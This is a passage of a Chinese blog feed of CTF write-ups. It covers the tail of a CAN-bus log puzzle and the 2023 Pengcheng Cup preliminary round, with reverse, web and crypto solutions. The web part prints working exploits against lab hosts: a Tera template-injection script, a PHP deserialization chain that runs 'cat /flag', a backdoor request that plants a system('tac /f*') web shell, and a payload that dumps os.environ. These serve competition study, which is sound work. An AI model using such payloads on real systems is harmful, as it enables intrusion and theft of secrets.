<span class="hljs-keyword">match</span>.groups()<br>            <span class="hljs-comment"># 只合并非全零的数据帧</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(c == <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data):<br>                <span class="hljs-keyword">if</span> can_id <span class="hljs-keyword">in</span> can_data:<br>                    can_data[can_id] += data<br>                <span class="hljs-keyword">else</span>:<br>                    can_data[can_id] = data<br><br><span class="hljs-comment"># 现在打印输出</span><br><span class="hljs-keyword">for</span> can_id <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(can_data.keys()):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;CAN ID <span class="hljs-subst">&#123;can_id&#125;</span>: <span class="hljs-subst">&#123;can_data[can_id]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>将data区6个字节提取出来，转换成字符串即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 正则表达式匹配带有特定CAN ID和数据后缀为03的记录</span><br><span class="hljs-comment"># 假定数据记录格式为：&quot;(timestamp) can1 911#03XXXXXX&quot;，其中X是我们需要的字节</span><br>log_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\(.*?\)\s+can1\s+911#03([0-9A-F]&#123;6&#125;)&#x27;</span>, re.IGNORECASE)<br><br><span class="hljs-comment"># 存储匹配字节的列表</span><br>matched_bytes = []<br><br><span class="hljs-comment"># 读取文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        <span class="hljs-keyword">match</span> = log_pattern.search(line.strip())<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            <span class="hljs-comment"># 添加匹配的字节（后三个字节数据）</span><br>            matched_bytes.append(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># 将所有匹配的字节拼接成一个字符串</span><br>combined_hex = <span class="hljs-string">&#x27;&#x27;</span>.join(matched_bytes)<br><br><span class="hljs-comment"># 将十六进制字符串转换成ASCII格式的字符串</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_ascii</span>(<span class="hljs-params">hex_string</span>):<br>    ascii_string = <span class="hljs-built_in">bytearray</span>.fromhex(hex_string).decode()<br>    <span class="hljs-keyword">return</span> ascii_string<br><br>combined_ascii = hex_to_ascii(combined_hex)<br><br><span class="hljs-comment"># 输出原始拼接的十六进制数据和对应的ASCII字符串</span><br><span class="hljs-comment">#print(f&quot;Combined hex data: &#123;combined_hex&#125;&quot;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Combined ASCII data: <span class="hljs-subst">&#123;combined_ascii&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#Combined ASCII data: flag_len:s39f1dll9f4hb6aya9djyig008cb8306703ac96Dar</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023鹏城杯初赛</title>
    <link href="/2023/11/04/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/"/>
    <url>/2023/11/04/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="安全编程"><a href="#安全编程" class="headerlink" title="安全编程"></a>安全编程</h2><p><img src="/mdimg/2023pcb/1.png"><br>修复文件头即可</p><h2 id="BabyRe"><a href="#BabyRe" class="headerlink" title="BabyRe"></a>BabyRe</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python">rand = [<span class="hljs-number">19954</span>,<span class="hljs-number">28965</span>,<span class="hljs-number">14137</span>,<span class="hljs-number">3558</span>,<span class="hljs-number">10069</span>,<span class="hljs-number">31251</span>,<span class="hljs-number">32362</span>,<span class="hljs-number">11940</span>,<span class="hljs-number">3430</span>,<span class="hljs-number">27969</span>,<span class="hljs-number">14847</span>,<span class="hljs-number">11465</span>,<span class="hljs-number">12175</span>,<span class="hljs-number">9021</span>,<span class="hljs-number">27614</span>,<span class="hljs-number">8175</span>,<span class="hljs-number">12050</span>,<span class="hljs-number">16408</span>,<span class="hljs-number">20581</span>,<span class="hljs-number">6478</span>,<span class="hljs-number">17749</span>,<span class="hljs-number">4203</span>,<span class="hljs-number">22364</span>,<span class="hljs-number">2272</span>,<span class="hljs-number">9340</span>,<span class="hljs-number">14232</span>,<span class="hljs-number">10535</span>,<span class="hljs-number">32196</span>,<span class="hljs-number">17981</span>,<span class="hljs-number">4946</span>,<span class="hljs-number">3136</span>,<span class="hljs-number">17889</span>,<span class="hljs-number">7408</span>,<span class="hljs-number">30816</span>,<span class="hljs-number">16101</span>,<span class="hljs-number">12491</span>,<span class="hljs-number">23270</span>,<span class="hljs-number">11421</span>,<span class="hljs-number">6414</span>,<span class="hljs-number">31210</span>,<span class="hljs-number">17404</span>,<span class="hljs-number">16964</span>,<span class="hljs-number">2722</span>,<span class="hljs-number">7641</span>,<span class="hljs-number">15728</span>,<span class="hljs-number">14442</span>,<span class="hljs-number">18922</span>,<span class="hljs-number">7948</span>,<span class="hljs-number">4083</span>,<span class="hljs-number">1228</span>,<span class="hljs-number">17990</span>,<span class="hljs-number">32182</span>,<span class="hljs-number">4095</span>,<span class="hljs-number">27339</span>,<span class="hljs-number">13087</span>,<span class="hljs-number">26345</span>,<span class="hljs-number">8298</span>,<span class="hljs-number">17333</span>,<span class="hljs-number">16156</span>,<span class="hljs-number">24319</span>,<span class="hljs-number">17212</span>,<span class="hljs-number">7238</span>,<span class="hljs-number">19353</span>,<span class="hljs-number">27450</span>,<span class="hljs-number">11454</span>,<span class="hljs-number">19311</span>,<span class="hljs-number">14421</span>,<span class="hljs-number">32423</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">26197</span>,<span class="hljs-number">5994</span>,<span class="hljs-number">11848</span>,<span class="hljs-number">651</span>,<span class="hljs-number">13725</span>,<span class="hljs-number">23939</span>,<span class="hljs-number">28785</span>,<span class="hljs-number">28150</span>,<span class="hljs-number">4071</span>,<span class="hljs-number">25161</span>,<span class="hljs-number">27507</span>,<span class="hljs-number">5174</span>,<span class="hljs-number">15768</span>,<span class="hljs-number">17694</span>,<span class="hljs-number">6008</span>,<span class="hljs-number">18904</span>,<span class="hljs-number">18909</span>,<span class="hljs-number">2574</span>,<span class="hljs-number">14254</span>,<span class="hljs-number">5989</span>,<span class="hljs-number">25837</span>,<span class="hljs-number">770</span>,<span class="hljs-number">28328</span>,<span class="hljs-number">3123</span>,<span class="hljs-number">15246</span>,<span class="hljs-number">22839</span>,<span class="hljs-number">29185</span>,<span class="hljs-number">13185</span>,<span class="hljs-number">26586</span>,<span class="hljs-number">19183</span>,<span class="hljs-number">8514</span>,<span class="hljs-number">24515</span>,<span class="hljs-number">24387</span>,<span class="hljs-number">29031</span>,<span class="hljs-number">1029</span>,<span class="hljs-number">16443</span>,<span class="hljs-number">469</span>,<span class="hljs-number">8968</span>,<span class="hljs-number">29531</span>,<span class="hljs-number">29897</span>,<span class="hljs-number">11963</span>,<span class="hljs-number">17889</span>,<span class="hljs-number">29292</span>,<span class="hljs-number">5124</span>,<span class="hljs-number">517</span>,<span class="hljs-number">9813</span>,<span class="hljs-number">31325</span>,<span class="hljs-number">22409</span>,<span class="hljs-number">8104</span>,<span class="hljs-number">9745</span>,<span class="hljs-number">15735</span>,<span class="hljs-number">25236</span>,<span class="hljs-number">12230</span>,<span class="hljs-number">22338</span>,<span class="hljs-number">9605</span>,<span class="hljs-number">22221</span>,<span class="hljs-number">28720</span>,<span class="hljs-number">22532</span>,<span class="hljs-number">4477</span>,<span class="hljs-number">11108</span>,<span class="hljs-number">32554</span>,<span class="hljs-number">541</span>,<span class="hljs-number">5731</span>,<span class="hljs-number">31327</span>,<span class="hljs-number">17262</span>,<span class="hljs-number">17131</span>,<span class="hljs-number">18283</span>,<span class="hljs-number">14387</span>,<span class="hljs-number">5491</span>,<span class="hljs-number">12187</span>,<span class="hljs-number">18782</span>,<span class="hljs-number">2450</span>,<span class="hljs-number">3566</span>,<span class="hljs-number">10652</span>,<span class="hljs-number">13630</span>,<span class="hljs-number">11141</span>,<span class="hljs-number">7578</span>,<span class="hljs-number">10067</span>,<span class="hljs-number">3629</span>,<span class="hljs-number">8634</span>,<span class="hljs-number">21044</span>,<span class="hljs-number">29969</span>,<span class="hljs-number">20107</span>,<span class="hljs-number">7967</span>,<span class="hljs-number">27850</span>,<span class="hljs-number">578</span>,<span class="hljs-number">20575</span>,<span class="hljs-number">23728</span>,<span class="hljs-number">11574</span>,<span class="hljs-number">3815</span>,<span class="hljs-number">5368</span>,<span class="hljs-number">21132</span>,<span class="hljs-number">30438</span>,<span class="hljs-number">19782</span>,<span class="hljs-number">12244</span>,<span class="hljs-number">1871</span>,<span class="hljs-number">13022</span>,<span class="hljs-number">19423</span>,<span class="hljs-number">22720</span>,<span class="hljs-number">27036</span>,<span class="hljs-number">4863</span>,<span class="hljs-number">15267</span>,<span class="hljs-number">26945</span>,<span class="hljs-number">26617</span>,<span class="hljs-number">6793</span>,<span class="hljs-number">26209</span>,<span class="hljs-number">18739</span>,<span class="hljs-number">15072</span>,<span class="hljs-number">4063</span>,<span class="hljs-number">27009</span>,<span class="hljs-number">3760</span>,<span class="hljs-number">5394</span>,<span class="hljs-number">15242</span>,<span class="hljs-number">2292</span>,<span class="hljs-number">21811</span>,<span class="hljs-number">11823</span>,<span class="hljs-number">6273</span>,<span class="hljs-number">11883</span>,<span class="hljs-number">4093</span>,<span class="hljs-number">23428</span>,<span class="hljs-number">22951</span>,<span class="hljs-number">26823</span>,<span class="hljs-number">23480</span>]<br>msg = [<span class="hljs-number">72</span>,  <span class="hljs-number">77</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">160</span>,  <span class="hljs-number">39</span>,  <span class="hljs-number">49</span>,  <span class="hljs-number">40</span>,  <span class="hljs-number">84</span>, <span class="hljs-number">109</span>, <span class="hljs-number">241</span>,<br>   <span class="hljs-number">33</span>,  <span class="hljs-number">53</span>,  <span class="hljs-number">24</span>, <span class="hljs-number">115</span>, <span class="hljs-number">106</span>,  <span class="hljs-number">76</span>, <span class="hljs-number">113</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">189</span>, <span class="hljs-number">152</span>,<br>  <span class="hljs-number">182</span>,  <span class="hljs-number">90</span>, <span class="hljs-number">119</span>,  <span class="hljs-number">45</span>,  <span class="hljs-number">11</span>,  <span class="hljs-number">43</span>, <span class="hljs-number">203</span>, <span class="hljs-number">155</span>, <span class="hljs-number">228</span>, <span class="hljs-number">138</span>,<br>   <span class="hljs-number">76</span>, <span class="hljs-number">169</span>,  <span class="hljs-number">92</span>,  <span class="hljs-number">79</span>,  <span class="hljs-number">27</span>, <span class="hljs-number">241</span>, <span class="hljs-number">152</span>,  <span class="hljs-number">61</span>,  <span class="hljs-number">48</span>,  <span class="hljs-number">89</span>,<br>   <span class="hljs-number">63</span>,  <span class="hljs-number">20</span>, <span class="hljs-number">252</span>, <span class="hljs-number">122</span>, <span class="hljs-number">244</span>, <span class="hljs-number">100</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">43</span>]<br><br><span class="hljs-built_in">dict</span> = &#123;&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-built_in">dict</span>[(<span class="hljs-number">23</span>*(i)+<span class="hljs-number">66</span>)&amp;<span class="hljs-number">0xff</span>]=i<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>)<br><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(msg),<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        t=msg[ip:ip+<span class="hljs-number">12</span>]<br>        tmp=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t]<br>        data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">4</span>):<br>            data.append(<span class="hljs-built_in">int</span>.from_bytes(tmp[i:i+<span class="hljs-number">4</span>],<span class="hljs-string">&quot;little&quot;</span>))<br>        get = data<br><br>        v23 = get[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">4</span>] + v23<br>        v25 = (get[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">2</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">5</span>] ^ v25)<br>        data[<span class="hljs-number">2</span>] &amp;= <span class="hljs-number">0xffffffff</span><br><br><br>        v23 = get[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">2</span>] + v23<br>        v25 = (get[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">1</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">3</span>] ^ v25)<br>        data[<span class="hljs-number">1</span>] &amp;= <span class="hljs-number">0xffffffff</span><br><br><br>        v23 = get[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j] + v23<br>        v25 = (get[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">1</span>]&lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">0</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">1</span>] ^ v25)<br>        data[<span class="hljs-number">0</span>]&amp;=<span class="hljs-number">0xffffffff</span><br><br><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            i1=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(data[item])[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;0&quot;</span>))][::-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                msg[ip+<span class="hljs-number">4</span>*item+i2]=<span class="hljs-built_in">dict</span>[i1[i2]]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(msg))<br></code></pre></td></tr></table></figure><h2 id="bad-pe"><a href="#bad-pe" class="headerlink" title="bad_pe"></a>bad_pe</h2><p><img src="/mdimg/2023pcb/2.png"><br>这里有个异或0x23，对.ATOM段进行异或，可以恢复程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad_pe.exe&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br>encode = data[<span class="hljs-number">0x2e00</span>:<span class="hljs-number">0x10c00</span>]<br>t = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encode)):<br>    t.append((encode[i]^<span class="hljs-number">0x23</span>)&amp;<span class="hljs-number">0xff</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.exe&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)):<br>        f.write(t[i].to_bytes(<span class="hljs-number">1</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023pcb/3.png"><br>rc4加密，调试找到密钥和密文即可<br><img src="/mdimg/2023pcb/4.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Tera"><a href="#Tera" class="headerlink" title="Tera"></a>Tera</h2><p><a href="https://blog.xinshijiededa.men/writeup/buaactf-2023/">https://blog.xinshijiededa.men/writeup/buaactf-2023/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> socks<br><br>url = <span class="hljs-string">&quot;http://172.10.0.3:8081/&quot;</span><br><br>string = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&quot;</span><br><br><span class="hljs-comment"># proxy = &#123;&quot;http&quot;: &quot;127.0.0.1:8081&quot;&#125;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:<br>    data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&#123;% set arr = [__tera_context] %&#125;</span><br><span class="hljs-string">&#123;% set f = get_env(name=&quot;fl&quot;~&quot;ag&quot;) %&#125;</span><br><span class="hljs-string">&#123;%- for char in __tera_context -%&#125;</span><br><span class="hljs-string">    &#123;%- if char == &#x27;&quot;&quot;&quot;</span> + i + <span class="hljs-string">&quot;&quot;&quot;&#x27; -%&#125;&quot;&quot;&quot;</span> + i + <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#123;%- else -%&#125;</span><br><span class="hljs-string">    &lt;</span><br><span class="hljs-string">    &#123;%- endif -%&#125;</span><br><span class="hljs-string">&#123;% endfor %&#125;&quot;&quot;&quot;</span><br>    res = requests.post(url=url, data=data)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hacker</span>&#123;<br>    private $exp;<br>    private $cmd;<br><br>    public  function __toString()<br>    &#123;<br>        call_user_func(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">H</span><br>&#123;<br>    public $username=<span class="hljs-string">&quot;admin&quot;</span>;<br>    public function __destruct()<br>    &#123;<br>        $this-&gt;welcome();<br><br>    &#125;<br>    public  function welcome()<br>    &#123;<br>        echo <span class="hljs-string">&quot;welcome~ &quot;</span>.$this-&gt;username;<br>    &#125;<br>&#125;<br><br><br>$res=new H();<br>$rev = new Hacker();<br>$res-&gt;username=$rev;<br>echo serialize($res);<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://172.10.0.5:80/&quot;</span><br>dirs = <span class="hljs-string">&quot;abcdef1234567890&quot;</span><br>exp = <span class="hljs-string">&quot;glob://backdoor_&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dirs:<br>        tmp = exp + i + <span class="hljs-string">&quot;*.php&quot;</span><br>        data = &#123;<span class="hljs-string">&quot;filename&quot;</span>: tmp&#125;<br>        content = requests.post(url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yesyesyes!!!&quot;</span> <span class="hljs-keyword">in</span> content:<br>            exp = exp + i<br>            <span class="hljs-built_in">print</span>(exp)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=<span class="hljs-number">1</span>&amp;title[]=.php&amp;data[]=&lt;?php system(<span class="hljs-string">&#x27;tac /f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape"></a>Escape</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span>:<span class="hljs-number">10000</span>/?username=%7Bpasshash.__str__.__globals__%5Bapp%5D.wsgi_app.__globals__%5Bos%5D.environ%7D&amp;password=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SecretShare"><a href="#SecretShare" class="headerlink" title="SecretShare"></a>SecretShare</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python">res = <span class="hljs-string">&#x27;&#x27;&#x27;27322282703709511636610535806856853612612796524565963685352821215367702697670029638291472271242231649191714479260517868076984065989639273952206721225394449809512736309152963717666213669565294618889004878502587203292128915123582846437035618297859622373514552659661751919687138158714389205196365694996691846589 48569244180151557205855904296808011040310995626104180491157243372509052545941856322458676083637192423759673249488348244220016168699221727901608142636001227515271570470832957720323162015971262916929310707561503164723954043820660896942792324593262461443662124187475159194385198887788939215142063719188348359051</span><br><span class="hljs-string">91805670014258342004112051538515158497977951249015335208828337677065661825541672701641011001509677094927054079355384880161339840664535548572711525978354947655159331190183669338379535914171636373271711777662899462412133698069202075760175522929409084089926367963132890460921167025666146228784502671381146711019 399560428917764748532974912549579755263000603891290776423346071350694440330590365031312031331274402458285677563081638572382883720599282186196046608483533823720739712120092762382758124206813101015928952314835833408960456083078746116580899849811889743359253318716527623535224217277574914341453477162101109304521</span><br><span class="hljs-string">66920426958285786458658248767160362920977647430969423155679844462544037512659182174429654322739226216034435833627040279237803034255254749729584723025199164153117416758037930376665769001615518843769072788984118288795594844920830871790000441610452127329422157793240336858492947908675187651204641324347460068225 